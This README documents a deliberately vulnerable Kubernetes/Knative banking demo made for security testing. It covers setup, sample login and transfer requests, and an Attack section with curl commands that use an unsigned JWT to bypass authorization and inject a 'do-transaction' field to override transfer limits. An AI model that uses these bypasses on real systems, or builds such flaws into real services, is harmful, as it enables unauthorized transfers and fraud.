# Bank Application

This is a simple application developed to work like a sample banking application.
It simply allows authenticated and authorized users to make transactions with other clients.
The workflow can be analyzed in the figure below.
![workflow](workflow/src/main/resources/workflow.svg)

## Requirements

Their Kubernetes installation configurations are placed at the root of this repository.
To install them (from the repository root):
```bash
cd mysql-baas; kubectl apply -f mysql.yaml && kubectl apply -f directus.yaml
```

Then, you must access the Directus webpage, and add three data models: `requests`, `transactions`, and `users`.
Below, you can find screenshots of the expected fields and layout of these data models.
In the `transactions` data model, `from` and `to` are many-to-one fields related to the `users` data model.
![requests](figures/requests.png)
![transactions](figures/transactions.png)
![users](figures/users.png)

Moreover, you must also create a token for later access from this application functions.
This is achieved in `User Directory` -> `<user>` -> `Token`.
At the end, copy the token and paste it into this application directory's `Kubernetes.yaml` file, replacing the `directus_api_token` value.

## NOTE: THIS APPLICATION HAS INTENTIONAL VULNERABILITIES

This application was purposely made to test security-related scenarios. Therefore, it presents two/three vulnerabilities:
- In the `authorization` function, the user is able to get authorization by giving a JWT with an invalid signature (or even without one);
- Both `authorization` and `verify-transaction` functions do not correctly process the received JSON request. Since they return `do-verification` or `do-transaction`, respectively, as `true` or `false` depending on whether the request is allowed or not, an attacker will be able to send these values in the requested JSON, and they will be used by the workflow instead (these functions will rewrite the response JSON with the request JSON).

All these functions are deployed as Knative Services.

## Install
```
cd workflow/src/main/kubernetes && kubectl apply -f kogito.yml && kubectl apply -f knative.yml && cd ../../../../
kubectl apply -f kubernetes.yaml
```

## Examples

### Login

You must first log in with success and obtain a valid JWT to achieve a successful transaction.
For this, we advise first creating two users in Directus, like so:
![users](figures/users_list.png)

Note that passwords must be generated using bcrypt.
You can do so in Bash (and Python) like follows:
```bash
python -c 'import bcrypt; print(bcrypt.hashpw("<password>".encode(), bcrypt.gensalt()).decode())'
```

Finally, you just need to call the app's login URL (change the URL accordingly):
```bash
curl http://login.bank-app.10.255.30.38.sslip.io --data '{"username": "admin", "password": "olaadeus"}' -H 'Content-Type: application/json' -v
* Host login.bank-app.10.255.30.38.sslip.io:80 was resolved.
* IPv6: (none)
* IPv4: 10.255.30.38
*   Trying 10.255.30.38:80...
* Connected to login.bank-app.10.255.30.38.sslip.io (10.255.30.38) port 80
> POST / HTTP/1.1
> Host: login.bank-app.10.255.30.38.sslip.io
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
> 
< HTTP/1.1 200 OK
< authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImhhc19hY2Nlc3MiOnRydWUsImlhdCI6MTc0OTEzNzA3OCwiZXhwIjoxNzQ5MTQwNjc4fQ.hWxsbdeNe9vzXGrFEi69mgfui-XfcX-h5_CUu84j2ng
< content-length: 0
< content-type: text/html; charset=utf-8
< date: Thu, 05 Jun 2025 15:24:38 GMT
< server: envoy
< x-envoy-upstream-service-time: 653
< 
* Connection #0 to host login.bank-app.10.255.30.38.sslip.io left intact
```

At the end, just copy the `authorization` header.

### Transaction

After a successful login, you will have the JWT with which you can do a transaction.
To do so, you must also specify to which client to send the amount.
Then, just make the request:
```bash
curl entry-point.bank-app.10.255.30.38.sslip.io --data '{"destination_client": "attacker", "amount": "100"}' -H 'Content-Type: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImhhc19hY2Nlc3MiOnRydWUsImlhdCI6MTc0OTEzNzA3OCwiZXhwIjoxNzQ5MTQwNjc4fQ.hWxsbdeNe9vzXGrFEi69mgfui-XfcX-h5_CUu84j2ng"
```

You can check the result by getting the logs from the `result` function.

Moreover, you can specify an amount larger than what is allowed.
To proceed, you must also give an OTP (in this example, it is not a real OTP, but it would be something like that in a real scenario).
The OTP value can be checked in the `kubernetes.yaml` file under `otp_secret` (do not forget to decode it from base64):
Note that the maximum amount is also specified in this file.
Example:
```bash
curl entry-point.bank-app.10.255.30.38.sslip.io --data '{"destination_client": "adattackermattackerin", "amount": "1001", "otp": 123456}' -H 'Content-Type: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImhhc19hY2Nlc3MiOnRydWUsImlhdCI6MTc0OTEzNzA3OCwiZXhwIjoxNzQ5MTQwNjc4fQ.hWxsbdeNe9vzXGrFEi69mgfui-XfcX-h5_CUu84j2ng"
```

### Attack
#### Invalid JWT

Note that the signature is missing:
```bash
curl entry-point.bank-app.10.255.30.38.sslip.io --data '{"destination_client": "attacker", "amount": "100"}' -H 'Content-Type: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImhhc19hY2Nlc3MiOnRydWUsImlhdCI6MTc0OTEzNzA3OCwiZXhwIjoxNzQ5MTQwNjc4fQ."
```


#### JSON response injection

Note that now the `do-transaction` key and value are sent, and the amount is larger than the maximum allowed:
```bash
curl -X POST entry-point.bank-app.10.255.30.38.sslip.io --data '{"destination_client": "attacker", "amount": "1001", "do-transaction": true}' -H 'Content-Type: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImhhc19hY2Nlc3MiOnRydWUsImlhdCI6MTc0OTEzNzA3OCwiZXhwIjoxNzQ5MTQwNjc4fQ." -v
```
